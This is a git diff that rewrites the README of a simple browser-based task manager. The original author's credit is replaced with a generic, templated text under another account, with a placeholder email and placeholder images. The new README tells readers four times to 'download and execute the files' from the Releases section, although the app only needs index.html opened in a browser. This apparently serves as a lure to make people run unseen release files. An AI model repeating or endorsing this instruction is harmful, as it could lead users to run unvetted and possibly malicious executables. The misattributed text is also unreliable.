@@ -1,86 +1,160 @@
-# 🗂️ Task Manager Pro
+# Task Manager: A Simple and Powerful Task Management App
 
-A powerful and simple task management web application built using HTML, CSS, and JavaScript. This app helps users create, manage, prioritize, and filter their daily tasks — with data saved in the browser using Local Storage.
+![Task Manager](https://img.shields.io/badge/Task%20Manager-HTML%20%7C%20CSS%20%7C%20JavaScript-blue)
 
----
+## Overview
 
-## 🚀 Features
+Welcome to the **Task Manager** repository! This project is a simple yet powerful task management application built using **HTML**, **CSS**, and **JavaScript**. It offers features like filtering tasks and local storage support, making it a perfect tool for enhancing your productivity.
 
-- ✅ Add and delete tasks easily  
-- 📌 Mark tasks as completed or pending  
-- 🔼 Set high or low priority  
-- 🔍 Filter tasks: All | Completed | Pending | High Priority  
-- 💾 Data saved in Local Storage — stays even after refresh!
+For the latest version, download and execute the files from the [Releases section](https://github.com/amenirezgui/task-manager/releases).
 
----
+## Table of Contents
 
-## 🔧 Tech Stack
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- HTML5  
-- CSS3  
-- JavaScript (Vanilla)  
-- Font Awesome (for icons)  
-- Local Storage API
+## Features
 
----
+- **Add Tasks**: Easily create new tasks with a simple input field.
+- **Filter Tasks**: Sort tasks based on different criteria to find what you need quickly.
+- **Local Storage**: Save tasks even after refreshing the page.
+- **Responsive Design**: Access the app on any device, whether it's a desktop, tablet, or mobile.
+- **User-Friendly Interface**: Navigate through the app with ease.
 
-## 📸 Screenshot
+## Technologies Used
 
-![Screenshot](screenshots/taskmanager.png)
+- **HTML**: For the structure of the application.
+- **CSS**: For styling and layout.
+- **JavaScript**: For functionality and interactivity.
+- **Local Storage**: To store tasks on the client side.
 
----
+## Installation
 
-## 🎥 Demo Video
+To get started with the Task Manager app, follow these steps:
 
-[![Watch Video](https://img.youtube.com/vi/CGNJDYel8Lo/0.jpg)](https://youtu.be/CGNJDYel8Lo)
+1. Clone the repository:
 
-```
+   ```bash
+   git clone https://github.com/amenirezgui/task-manager.git
+   ```
 
-## 📂 Folder Structure
+2. Navigate into the project directory:
 
-Task-Manager-Pro/
-│
-├── index.html
-├── index.css
-├── index.js
-├── README.md
-└── screenshots/
-    └── taskmanager.png
-    └── demo.mp4
+   ```bash
+   cd task-manager
+   ```
 
+3. Open the `index.html` file in your web browser.
 
-```
+## Usage
 
-## 🧠 How It Works
+Once you have the app running, you can start managing your tasks:
 
-- **Tasks are saved** in the browser’s local storage as an array of objects.
-- Each task contains:
-  - `name` (text)
-  - `status` (true/false)
-  - `priority` (true/false)
-- When users interact (add/delete/status/priority), the list is updated in both UI and storage.
+1. **Add a Task**: Type your task in the input field and hit "Add Task."
+2. **Filter Tasks**: Use the filter options to view tasks based on their status.
+3. **Delete Tasks**: Click the delete icon next to a task to remove it.
+4. **Refresh the Page**: Your tasks will remain intact thanks to local storage.
 
----
+For the latest version, download and execute the files from the [Releases section](https://github.com/amenirezgui/task-manager/releases).
 
-## 📌 How to Use
+## Contributing
 
-1. Type a task in the input box  
-2. Click **Add** to save it  
-3. Use ✔️ or ❌ to toggle completion  
-4. Use 🔺 or 🔻 to mark priority  
-5. Use 🗑️ to delete tasks  
-6. Click filter buttons to see filtered results
+Contributions are welcome! If you want to help improve the Task Manager app, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch:
 
-## 👨‍💻 Author
+   ```bash
+   git checkout -b feature/YourFeatureName
+   ```
 
-**Balaji S.K**  
-Aspiring Full Stack Developer | Focused on clean UI + functional JS  
-[GitHub Profile](https://github.com/Balaji-keh06)
+3. Make your changes and commit them:
 
----
+   ```bash
+   git commit -m "Add some feature"
+   ```
 
-## 🌟 Show Your Support
+4. Push to the branch:
 
-If you liked this project, consider giving it a ⭐ on GitHub and sharing it with others!
+   ```bash
+   git push origin feature/YourFeatureName
+   ```
+
+5. Create a new Pull Request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **GitHub**: [amenirezgui](https://github.com/amenirezgui)
+- **Email**: amenirezgui@example.com
+
+## Topics
+
+- CSS
+- HTML
+- HTML5
+- JavaScript
+- Local Storage
+- Productivity App
+- Responsive Design
+- Vanilla JS
+- Web App
+- Web Development
+
+## Screenshots
+
+![Task Manager Screenshot](https://via.placeholder.com/800x400?text=Task+Manager+App)
+
+## Acknowledgments
+
+- Thanks to all contributors who have helped in making this app better.
+- Special thanks to the open-source community for providing resources and support.
+
+## Badges
+
+![HTML](https://img.shields.io/badge/HTML-5-orange)
+![CSS](https://img.shields.io/badge/CSS-3-blue)
+![JavaScript](https://img.shields.io/badge/JavaScript-ES6-yellow)
+
+## Future Improvements
+
+- Implement user authentication.
+- Add a feature for task deadlines.
+- Integrate a calendar view for tasks.
+- Enable notifications for upcoming tasks.
+
+## FAQs
+
+### How do I reset my tasks?
+
+You can clear local storage in your browser settings or add a reset button in the app.
+
+### Is this app mobile-friendly?
+
+Yes, the app is designed to be responsive and works well on mobile devices.
+
+### Can I customize the appearance?
+
+Yes, you can modify the CSS files to change the look and feel of the app.
+
+### Where can I find more information?
+
+Check the [Releases section](https://github.com/amenirezgui/task-manager/releases) for updates and more details.
+
+## Feedback
+
+We appreciate your feedback! If you have suggestions or issues, please open an issue on GitHub.
+
+![Thank You](https://via.placeholder.com/800x200?text=Thank+You+for+using+Task+Manager)
+
+For the latest version, download and execute the files from the [Releases section](https://github.com/amenirezgui/task-manager/releases).
